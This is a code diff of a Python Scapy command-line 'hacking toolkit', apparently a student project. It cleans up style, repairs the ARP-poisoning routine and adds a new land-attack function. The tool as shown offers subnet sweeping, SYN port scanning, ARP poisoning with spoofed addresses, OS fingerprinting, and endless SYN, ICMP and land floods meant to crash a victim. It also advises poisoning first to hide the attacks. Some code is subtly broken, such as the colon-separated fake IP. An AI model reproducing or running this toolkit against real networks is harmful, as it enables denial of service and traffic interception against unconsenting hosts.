@@ -18,7 +18,6 @@ __email__ = 'jean-hieu.huynh@ensea.fr'
 __version__ = '0.0.1'
 
 import logging
-from docopt import docopt
 from scapy.all import *
 import random
 
@@ -48,7 +47,8 @@ usedIP = None
 usedMAC = None
 """Used MAC address"""
 
-################################################################################
+###############################################################################
+
 
 def sweep_subnet():
     """Stores the reachable IP addresses of the subnet given in CLI"""
@@ -65,7 +65,6 @@ def sweep_subnet():
     for i in range(len(ans)):
         res.append(ans[i][1].src)
     target_IP = res
-    
 
 
 def scan_port():
@@ -74,10 +73,10 @@ def scan_port():
     global usedIP
     res = []
     target = str(input('Please enter the IP address you wish to scan : '))
-    p_scan = IP(dst=target, src=usedIP) / TCP(dport=(0, 64000), flags="S");
+    p_scan = IP(dst=target, src=usedIP) / TCP(dport=(0, 64000), flags="S")
 
     print("Start scanning")
-    ans, nans = sr(p_scan, timeout = 5, verbose=0);
+    ans, nans = sr(p_scan, timeout=5, verbose=0)
     print("Scan done")
     for i in range(len(ans)):
         res.append(ans[i][1].sport)
@@ -85,19 +84,22 @@ def scan_port():
 
 
 def arp_pois():
-    """ARP poisons the victim given in CLI using the fake IP and MAC addresses"""
+    """ARP poisons the victim given in CLI using the fake IP and MAC
+    addresses"""
     global usedIP, usedMAC
     global myFakeIP, myFakeMAC
+
+    targetIP = str(input('Please enter the IP address of the victim : '))
+    ans, nans = sr(ARP(op=ARP.who_has, psrc=usedIP, pdst=targetIP))
+    targetMAC = ans[0][1].hwsrc
 
     usedIP = myFakeIP
     usedMAC = myFakeMAC
 
     print('Start ARP poisoning...')
-    targetMac = str(input('Please enter the IP address of the victim : '))
-    targetIP = str(input('Please enter the MAC address of the victim : '))
     arp_pois = Ether(dst=targetMAC, src=myFakeMAC) / ARP(op=2,
-                                                         hwsrc=myFakeMAC,
-                                                         psrc=myFakeIP,
+                                                         hwsrc=usedMAC,
+                                                         psrc=usedIP,
                                                          hwdst=targetMAC,
                                                          pdst=targetIP)
     srploop(arp_pois)
@@ -114,27 +116,41 @@ def find_OS():
     elif ans[0][1]['TCP'].flags == 20:
         print('Victim is running Windows')
 
-################################################################################
+###############################################################################
+
 
 def syn_flood():
     """Crashes a victim given in CLI using SYN flood"""
     global usedIP
     target = str(input('Please enter the targetted IP address : '))
     synflood = IP(dst=target, src=usedIP+'/16') / TCP(dst=80, flags="S")
-    while(1):
-        send(synflood)
+    print('Attacking now')
+    while 1:
+        send(synflood, verbose=0)
 
 
 def icmp_flood():
-    """Crashes a victim given in CLI using ICMP flood (Only efficient if you have more bandwidth than the victim)"""
+    """Crashes a victim given in CLI using ICMP flood (Only efficient if you
+    have more bandwidth than the victim)"""
     global usedIP
     target = str(input('Please enter the targetted IP address : '))
     icmp = IP(dst=target, src=usedIP) / ICMP() / "1234567890"
-    while(1):
-        send(icmp)
+    print('Attacking now')
+    while 1:
+        send(icmp, verbose=0)
 
 
-################################################################################
+def land_attack():
+    """Crashes a victim given in CLI using TCP packets with its own address as
+    source IP (Only efficient against Windows)"""
+    target = str(input('Please enter the targetted IP address : '))
+    packet = IP(dst=target, src=target) / TCP(dport=139, sport=139, flags="S")
+    print('Attacking now')
+    while 1:
+        send(packet, verbose=0)
+
+###############################################################################
+
 
 def initFake():
     """Initialize fake IP and MAC address"""
@@ -142,12 +158,13 @@ def initFake():
     global myFakeMAC
 
     print('\nInitializing fake IP and MAC address')
-    myFakeMAC = "52:54:00:%02x:%02x:%02x" %(random.randint(0, 255),
-                                        random.randint(0, 255),
-                                        random.randint(0, 255))
-    myFakeIP = "192:168:%d:%d" %(random.randint(0, 255), random.randint(0, 255))
-    print('New IP address is', myFakeIP)
-    print('New MAC address is', myFakeMAC, '\n')
+    myFakeMAC = "52:54:00:%02x:%02x:%02x" % (random.randint(0, 255),
+                                             random.randint(0, 255),
+                                             random.randint(0, 255))
+    myFakeIP = "192:168:%d:%d" % (random.randint(0, 255),
+                                  random.randint(0, 255))
+    print('Fake IP address is', myFakeIP)
+    print('Fake MAC address is', myFakeMAC, '\n')
 
 
 def find_IP():
@@ -156,7 +173,8 @@ def find_IP():
     s.connect(('google.com', 0))
     return s.getsockname()[0]
 
-################################################################################
+###############################################################################
+
 
 def printIP():
     """Prints the IP addresses contained in global variable target_IP"""
@@ -175,20 +193,22 @@ def printPorts():
     else:
         print('Available ports are :', target_port)
 
-################################################################################
+###############################################################################
+
 
 def ascii_art():
     import sys
 
     from colorama import init
-    init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
-    from termcolor import cprint 
+    init(strip=not sys.stdout.isatty())
+    from termcolor import cprint
     from pyfiglet import figlet_format
 
-    cprint(figlet_format('Supreme Hacking Toolkit', font='starwars'), 
+    cprint(figlet_format('Hacking Toolkit By JH', font='starwars'),
            'yellow', attrs=['bold'])
 
-################################################################################
+###############################################################################
+
 
 def main():
     """Main function that acts as a CLI"""
@@ -198,32 +218,33 @@ def main():
 
     ascii_art()
 
-    print ("Welcome to the hacking toolkit made by JH.")
+    print("Welcome to the hacking toolkit made by JH.")
 
-    print('It is recommended to start with ARP poisoning once you found your victim to hide your attacks !')
+    print("""It is recommended to start with ARP poisoning once you found your
+          victim to hide your attacks !""")
 
     myIP = find_IP()
     usedIP = myIP
 
-
     initFake()
     func = [printIP, printPorts,
             sweep_subnet, scan_port, arp_pois, find_OS,
-            syn_flood, icmp_flood]
+            syn_flood, icmp_flood, land_attack]
 
     invalid_input = True
-    def start() :
+
+    def start():
         for a, b in enumerate(func, 1):
             print('{} - {} : {}'.format(a, b.__name__, b.__doc__))
-        op = input ("Please input what operation you wish to perform : ")
+        op = input("Please input what operation you wish to perform : ")
 
         if int(op) <= len(func):
             func[int(op)-1]()
-            invalid_input = False # Set to False because input was valid
+            invalid_input = False
         else:
-            print ("Sorry, that was an invalid command!")
+            print("Sorry, that was an invalid command!")
 
-    while invalid_input : # this will loop until invalid_input is set to be True
+    while invalid_input:
         start()
         print('\n')
 
